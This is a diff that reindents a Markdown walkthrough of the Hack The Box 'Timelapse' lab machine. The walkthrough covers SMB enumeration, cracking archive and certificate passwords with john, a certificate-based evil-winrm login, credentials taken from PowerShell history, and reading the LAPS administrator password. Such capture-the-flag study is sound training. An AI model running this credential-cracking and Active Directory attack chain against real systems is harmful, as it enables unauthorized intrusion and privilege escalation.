@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```bash
 nmap -sV -sC -vv 10.10.11.152
 nmap -sU --top-ports=10 -vv 10.10.11.152
 
@@ -86,12 +86,12 @@ PORT     STATE         SERVICE      REASON
 53/udp   open          domain       udp-response ttl 127
 123/udp  open          ntp          udp-response ttl 127
 ```
-	- Kerberos, SMB, LDAP, SSL
-	- Domain : timelapse.htb
-	- SSL Common Name : dc01.timelapse.htb
+- Kerberos, SMB, LDAP, SSL
+- Domain : timelapse.htb
+- SSL Common Name : dc01.timelapse.htb
 ## SMB Enumeration
 - Tried null authentication with SMB:
-	```bash
+```bash
 smbclient -U '' -L //10.10.11.152 --password=''
 
 ---OUTPUT---
@@ -108,7 +108,7 @@ do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 - Also going to try with crackmapexec (NULL failed but guest passed):
-	```bash
+```bash
 crackmapexec smb 10.10.11.152 -u 'guest' -p '' --shares
 
 ---OUTPUT---
@@ -124,9 +124,9 @@ SMB         10.10.11.152    445    DC01             NETLOGON                    
 SMB         10.10.11.152    445    DC01             Shares          READ            
 SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share 
 ```
-	- We have read access on Shares which isn't a default share like the rest
+- We have read access on Shares which isn't a default share like the rest
 - We access the share via smbclient:
-	```bash
+```bash
 smbclient -U 'guest' //10.10.11.152/Shares --password=''
 smb: \> dir
 smb: \> cd Dev\
@@ -142,18 +142,18 @@ smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx
 smb: \HelpDesk\> exit
 ```
 - I installed libreoffice to open the files but we can also check the md5 hash and check it in virustotal to see if its a known document:
-	```bash
+```bash
 md5sum LAPS.x64.msi 
 
 ---OUTPUT---
 2f80ef0699d15d788caf897a9b3ceb05  LAPS.x64.msi
 ```
-	- We can then check in virustotal and it says it's a file distributed by Microsoft. So it probably won't have anything related to our box as its a generic file in our context.
-		- https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
-		- ![[Pasted image 20250421123440.png]]
+- We can then check in virustotal and it says it's a file distributed by Microsoft. So it probably won't have anything related to our box as its a generic file in our context.
+- https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+- ![[Pasted image 20250421123440.png]]
 - Tried ldapsearch as anonymous but it requires authentication
 - We try to crack the zip with john:
-	```bash
+```bash
 zip2john winrm_backup.zip
 vi winrm.hash     # Copy hash output from last command here
 john winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -162,7 +162,7 @@ john winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt
 supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
 ```
 - Unzipped the file and found a pfx file 
-	```bash
+```bash
 unzip winrm_backup.zip 
 
 ---OUTPUT---
@@ -171,7 +171,7 @@ Archive:  winrm_backup.zip
   inflating: legacyy_dev_auth.pfx
 ```
 - I then tried certipy auth command to see if it would work (FAILED):
-	```bash
+```bash
 certipy auth -pfx legacyy_dev_auth.pfx -domain 'timelapse.htb'
 certipy auth -pfx legacyy_dev_auth.pfx -domain 'dc01.timelapse.htb'
 
@@ -182,7 +182,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [-] Use -debug to print a stacktrace
 ```
 - I then read the file (with strings as cat won't give readable text):
-	```bash
+```bash
 strings legacyy_dev_auth.pfx
 
 ---RELEVANT-OUTPUT---
@@ -197,15 +197,15 @@ legacyy@timelapse.htb0
 ...
 ...
 ```
-	- Username may be legacyy rather than legacyy_dev
+- Username may be legacyy rather than legacyy_dev
 - Try to open the pfx file:
-	```bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx
 
 > Enter password:
 ```
 - I then try to crack the pfx file with john (takes some time to crack)
-	```bash
+```bash
 pfx2john legacyy_dev_auth.pfx
 vi legacyy.hash # Copy hash from last command here
 john legacyy_dev_auth.pfx --wordlist=/usr/share/wordlists/rockyou.txt
@@ -214,15 +214,15 @@ john legacyy_dev_auth.pfx --wordlist=/usr/share/wordlists/rockyou.txt
 thuglegacy       (legacyy_dev_auth.pfx)
 ```
 - We check if credentials work with crackmapexec
-	```bash
+```bash
 crackmapexec smb 10.10.11.152 -u 'legacyy_dev' -p 'thuglegacy'
 
 ---OUTPUT---
 SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.152    445    DC01             [+] timelapse.htb\legacyy_dev:thuglegacy 
 ```
-	- We get a hit. We try with winrm too (FAILS):
-		```bash
+- We get a hit. We try with winrm too (FAILS):
+```bash
 crackmapexec winrm 10.10.11.152 -u 'legacyy_dev' -p 'thuglegacy'
 
 ---OUTPUT-FAILED---
@@ -231,7 +231,7 @@ HTTP        10.10.11.152    5986   DC01             [*] https://10.10.11.152:598
 WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\legacyy_dev:thuglegacy "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f7438388c20>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"
 ```
 - I try to open the pfx file again with the password:
-	```bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -info
 Enter Import Password:
 
@@ -305,14 +305,14 @@ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
 -----END CERTIFICATE-----
 
 ```
-	- We see a key and a certificate.
+- We see a key and a certificate.
 - We extract it. Note that we can copy it but sometimes whitespace might affect the key so it's better to extract with the openssl command itself:
-	```bash
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert -nodes
 ```
 - We can check if winrm is open on target:
-	```bash
+```bash
 nmap -p5985-5986 10.10.11.152 -vv
 
 ---OUTPUT---
@@ -321,7 +321,7 @@ PORT     STATE    SERVICE REASON
 5986/tcp open     wsmans  syn-ack ttl 127
 ```
 - If we check evilwinrm help option we can see we can input a key and certificate file as well as ssl authentication:
-	```bash
+```bash
 evil-winrm -c key.cert -k key.pem  -i 10.10.11.152 --ssl           
 ---OUTPUT---
 Evil-WinRM shell v3.7
@@ -334,12 +334,12 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
 timelapse\legacyy
 ```
-	- We grab user flag
+- We grab user flag
 ## Lateral Movement
 - **IMPORTANT enumeration for Windows**
-	- https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
-	- To check powershell command history in the domain go to :
-		```bash
+- https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
+- To check powershell command history in the domain go to :
+```bash
 cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSreadLine
 type ConsoleHost_history.txt
 
@@ -355,9 +355,9 @@ SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
 ```
-		- We get some credentials.
+- We get some credentials.
 - We check with crackmapexec
-	```bash
+```bash
 crackmapexec winrm 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
 
 ---OUTPUT---
@@ -366,9 +366,9 @@ HTTP        10.10.11.152    5986   DC01             [*] https://10.10.11.152:598
 WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f44b58a8c20>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"
 
 ```
-	- It fails after the connection to 5985 times out (we require 5986 SSL though from our nmap so we try to login with winrm anyway)
+- It fails after the connection to 5985 times out (we require 5986 SSL though from our nmap so we try to login with winrm anyway)
 - we evil-winrm into the machine using SSL (doesn't work without):
-	```bash
+```bash
 evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
 
 ---OUTPUT---
@@ -388,17 +388,17 @@ timelapse\svc_deploy
 ```
 ## BloodHound
 - Now we have credentials we can grab files from target for analysis:
-	```bash
+```bash
 bloodhound-python --dns-tcp -ns 10.10.11.152 -d timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -c all
 ```
 - We mark `svc_deploy` and `legacyy` as owned.
-	- In `svc_deploy` we go to Outbound Object Control > Group Delegated Object Control
-		- ![[Pasted image 20250421144755.png]]
-			- We see that it is a member of LAPS_Readers group which can read the LAPS password
-				- I  tried the exploit from the Windows route which required PowerSploit but AV exists so I couldn't execute the command.
-					- Maybe with metasploit.
+- In `svc_deploy` we go to Outbound Object Control > Group Delegated Object Control
+- ![[Pasted image 20250421144755.png]]
+- We see that it is a member of LAPS_Readers group which can read the LAPS password
+- I  tried the exploit from the Windows route which required PowerSploit but AV exists so I couldn't execute the command.
+- Maybe with metasploit.
 - Used pyLAPS python file to grab the LAPS password:
-	```bash
+```bash
 python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
 
 ---OUTPUT---
@@ -414,7 +414,7 @@ python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12
 [+] All done!
 ```
 - Then logged in using winrm (note i just tested administrator but as svc_deploy we can pass `net users` to see the users):
-	```bash
+```bash
 evil-winrm -S -u 'administrator' -p '6112yW,$r%+.6b4&a+)&.uF#' -i 10.10.11.152
 
 ---OUTPUT---
@@ -433,35 +433,35 @@ timelapse\administrator
 - The root file wasn't in the Administrator's Desktop but the user TRC's Desktop.
 - **ALTERNATE METHOD**
 - We can find out we can exploit LAPS by checking svc_deploy's groups
-	```bash
+```bash
 net user svc_deploy
 
 ---OUTPUT-RELEVANT---
 Global Group memberships     *LAPS_Readers         *Domain Users
 ```
-	- We see `svc_deploy` is part of LAPS_Readers group.
-		- This is the group allowed to read LAPS Password.
-		- LAPS (Local Adminsitator Password Solution) randomizes local admin password for all machines (so we cant to Pass the Hash type things)
-			- however it stores it in active directory and only members of LAPS Reader can read the password
+- We see `svc_deploy` is part of LAPS_Readers group.
+- This is the group allowed to read LAPS Password.
+- LAPS (Local Adminsitator Password Solution) randomizes local admin password for all machines (so we cant to Pass the Hash type things)
+- however it stores it in active directory and only members of LAPS Reader can read the password
 - On searching google I first found a Get-LAPSADPassword command which didn't work from this link 
-	- https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps
+- https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps
 - Then from this link I found a command that retrieved the pwd in plaintext.
-	- https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1
-	- The documents we retrieved talked about what showed the password in plaintext so I search "AdmPwd" to find the entry:
-		```bash
+- https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1
+- The documents we retrieved talked about what showed the password in plaintext so I search "AdmPwd" to find the entry:
+```bash
 Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
 
 ---OUTPUT-RELEVANT---
 ms-Mcs-AdmPwd                        : 6112yW,$r%+.6b4&a+)&.uF#
 ```
 - I also tried the exploit from the Windows route which required PowerSploit but AV exists so I couldn't execute the command.
-	- Maybe with metasploit.
+- Maybe with metasploit.
 -------
 --------
 ## Extra
 - Enumeration
-	- can pass this command in powershell to list all directories even hidden ones:
-		```bash
+- can pass this command in powershell to list all directories even hidden ones:
+```bash
 gci -force
 #Shorthand for
 Get-ChildItem -Force
